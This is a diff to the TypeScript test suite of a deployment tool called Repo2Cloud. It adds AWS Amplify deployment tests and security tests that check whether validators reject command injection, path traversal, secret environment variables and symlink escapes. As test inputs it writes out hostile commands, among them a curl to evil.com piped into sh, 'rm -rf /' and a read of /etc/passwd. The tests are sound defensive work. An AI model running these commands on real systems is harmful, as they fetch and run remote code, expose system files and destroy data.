@@ -6,9 +6,17 @@ import fs from 'fs';
 import os from 'os';
 import path from 'path';
 import { DeploymentManager } from '../services/deploymentManager';
+import { isolatedBuildRunner } from '../services/isolatedBuilder';
 import { RepositoryAnalyzer } from '../services/repositoryAnalyzer';
+import { securityGuardrails } from '../services/securityGuardrails';
 import { DeploymentStore } from '../store/deploymentStore';
-import { resolveServerControlledDomain, validateGitHubRepoUrl, validateSubdomain } from '../utils/validation';
+import {
+  resolveServerControlledDomain,
+  sanitizeUserEnvVars,
+  validateBuildOverrides,
+  validateGitHubRepoUrl,
+  validateSubdomain,
+} from '../utils/validation';
 
 async function runPhase1To3Tests(): Promise<void> {
   console.log('=== Repo2Cloud Phase 1, Phase 2 & Phase 3 Verification Suite ===\n');
@@ -234,12 +242,150 @@ async function runPhase1To3Tests(): Promise<void> {
     true,
     'Lambda custom hostname must be released after delete'
   );
+  console.log(`   ✓ End-to-end Phase 5 Lambda + API Gateway deployment & teardown verified (${lambdaCompleted.url}).`);
+
+  // Phase 6: Managed Full-Stack / Next.js SSR Hosting on AWS Amplify
+  console.log('7. Testing Phase 6 (AWS Amplify Hosting + Auto amplify.yml + WEB_COMPUTE SSR + Custom Subdomain)...');
+  const amplifyStartRes = await manager.startDeployment({
+    repoUrl: 'https://github.com/example/nextjs-ssr-app',
+    target: 'AMPLIFY',
+    subdomain: 'nextjs-ssr',
+    domain: 'maas-fam.com',
+    branch: 'main',
+    buildCommandOverride: 'npm run build',
+    envVars: { NEXT_PUBLIC_API_URL: 'https://serverless-api.maas-fam.com' },
+  });
+  assert.strictEqual(amplifyStartRes.ok, true);
+  assert.strictEqual(amplifyStartRes.deployment?.target, 'AMPLIFY');
+  assert.strictEqual(amplifyStartRes.deployment?.deploymentType, 'amplify');
+  assert.strictEqual(amplifyStartRes.deployment?.customHostname, 'nextjs-ssr.maas-fam.com');
+
+  const amplifyDepId = amplifyStartRes.deployment!.deploymentId;
+  for (let i = 0; i < 40; i++) {
+    const current = store.get(amplifyDepId);
+    if (current?.status === 'LIVE' || current?.status === 'FAILED') {
+      break;
+    }
+    await new Promise((r) => setTimeout(r, 200));
+  }
+
+  const amplifyCompleted = store.get(amplifyDepId)!;
+  assert.strictEqual(amplifyCompleted.status, 'LIVE', 'AMPLIFY deployment must reach LIVE status');
+  assert.strictEqual(amplifyCompleted.url, 'https://nextjs-ssr.maas-fam.com');
+  assert.ok(amplifyCompleted.resources.amplifyAppId, 'Expected AWS Amplify App ID in resources');
+  assert.strictEqual(amplifyCompleted.resources.amplifyBranchName, 'main', 'Expected AWS Amplify branch name in resources');
+  assert.ok(
+    amplifyCompleted.infrastructureUrl?.endsWith('.amplifyapp.com'),
+    'Expected underlying *.amplifyapp.com URL in infrastructureUrl'
+  );
+  assert.strictEqual(amplifyCompleted.resources.route53RecordName, 'nextjs-ssr.maas-fam.com');
+
+  const amplifyDelRes = await manager.deleteDeployment(amplifyDepId);
+  assert.strictEqual(amplifyDelRes.ok, true);
+  assert.strictEqual(amplifyDelRes.deployment?.status, 'DELETED');
+  assert.strictEqual(
+    store.isHostnameAvailable('nextjs-ssr.maas-fam.com'),
+    true,
+    'Amplify custom hostname must be released after delete'
+  );
+  console.log(`   ✓ End-to-end Phase 6 AWS Amplify deployment & teardown verified (${amplifyCompleted.url}).`);
+
+  // Phase 7: Build Isolation, Security Guardrails & Cost/Resource Limits
+  console.log('8. Testing Phase 7 (Command Injection, Path Traversal, Secret Stripping, Symlink Escape & Quotas)...');
+
+  // 8a. Command injection in buildCommandOverride must be blocked
+  const cmdInj1 = validateBuildOverrides({
+    buildCommandOverride: 'npm run build; curl https://evil.com/shell.sh | sh',
+  });
+  assert.strictEqual(cmdInj1.valid, false, 'Command chaining with ; must be blocked');
+
+  const cmdInj2 = validateBuildOverrides({
+    buildCommandOverride: 'npm run $(whoami)',
+  });
+  assert.strictEqual(cmdInj2.valid, false, 'Subshell $(...) must be blocked');
+
+  const cmdInj3 = validateBuildOverrides({
+    buildCommandOverride: 'bash -c "cat /etc/passwd"',
+  });
+  assert.strictEqual(cmdInj3.valid, false, 'Arbitrary shell binary must be blocked');
+
+  const safeCmd = validateBuildOverrides({
+    buildCommandOverride: 'npm run build',
+    outputDirOverride: 'dist',
+    healthCheckPath: '/health',
+    lambdaHandler: 'index.handler',
+    containerPort: 8080,
+  });
+  assert.strictEqual(safeCmd.valid, true, 'Standard build overrides must be allowed');
+
+  // 8b. Path traversal in outputDirOverride must be blocked
+  assert.strictEqual(
+    validateBuildOverrides({ outputDirOverride: '../../etc' }).valid,
+    false,
+    'Relative path traversal (..) must be blocked'
+  );
+  assert.strictEqual(
+    validateBuildOverrides({ outputDirOverride: '/etc/passwd' }).valid,
+    false,
+    'Absolute path (/etc/passwd) must be blocked'
+  );
+  assert.strictEqual(
+    validateBuildOverrides({ outputDirOverride: '.git/config' }).valid,
+    false,
+    '.git directory exposure must be blocked'
+  );
+
+  // 8c. AWS_* and GITHUB_* secret env vars must be blocked
+  assert.strictEqual(
+    sanitizeUserEnvVars({ AWS_SECRET_ACCESS_KEY: 'leak' }).valid,
+    false
+  );
+  assert.strictEqual(
+    sanitizeUserEnvVars({ AWS_CUSTOM_CREDENTIAL: 'leak' }).valid,
+    false
+  );
+  assert.strictEqual(
+    sanitizeUserEnvVars({ GITHUB_ACCESS_TOKEN: 'leak' }).valid,
+    false
+  );
+
+  // 8d. Symlink escape outside workspace must be blocked
+  const symlinkTestDir = path.join(os.tmpdir(), `repo2cloud-symlink-test-${Date.now()}`);
+  fs.mkdirSync(symlinkTestDir, { recursive: true });
+  const escapeLinkPath = path.join(symlinkTestDir, 'escaped-secret.txt');
+  fs.symlinkSync('/etc/hosts', escapeLinkPath);
+  let symlinkBlocked = false;
+  try {
+    isolatedBuildRunner.verifyWorkspaceSafety(symlinkTestDir);
+  } catch (err: unknown) {
+    if (err instanceof Error && err.message.includes('Symlink escape blocked')) {
+      symlinkBlocked = true;
+    }
+  } finally {
+    fs.rmSync(symlinkTestDir, { recursive: true, force: true });
+  }
+  assert.strictEqual(symlinkBlocked, true, 'Symlink pointing outside workspace must be blocked');
+
+  // 8e. DeploymentManager rejects malicious overrides with 400 Bad Request
+  const badDeployRes = await manager.startDeployment({
+    repoUrl: 'https://github.com/example/vite-app',
+    target: 'S3_CLOUDFRONT',
+    buildCommandOverride: 'npm run build && rm -rf /',
+  });
+  assert.strictEqual(badDeployRes.ok, false);
+  assert.strictEqual(badDeployRes.statusCode, 400);
+
+  // 8f. Security guardrails status snapshot
+  const secStatus = securityGuardrails.getStatus(store);
+  assert.strictEqual(secStatus.isolation.awsCredentialsStripped, true);
+  assert.strictEqual(secStatus.isolation.symlinkEscapeProtection, true);
+  assert.strictEqual(secStatus.isolation.commandInjectionFilter, true);
 
   if (fs.existsSync(tmpStoreFile)) {
     fs.unlinkSync(tmpStoreFile);
   }
-  console.log(`   ✓ End-to-end Phase 5 Lambda + API Gateway deployment & teardown verified (${lambdaCompleted.url}).\n`);
-  console.log('ALL PHASE 1, PHASE 2, PHASE 3, PHASE 4 & PHASE 5 TESTS PASSED!');
+  console.log('   ✓ Phase 7 build isolation, command/path filters, symlink escape protection & quotas verified.\n');
+  console.log('ALL PHASE 1, PHASE 2, PHASE 3, PHASE 4, PHASE 5, PHASE 6 & PHASE 7 TESTS PASSED!');
 }
 
 runPhase1To3Tests().catch((err) => {
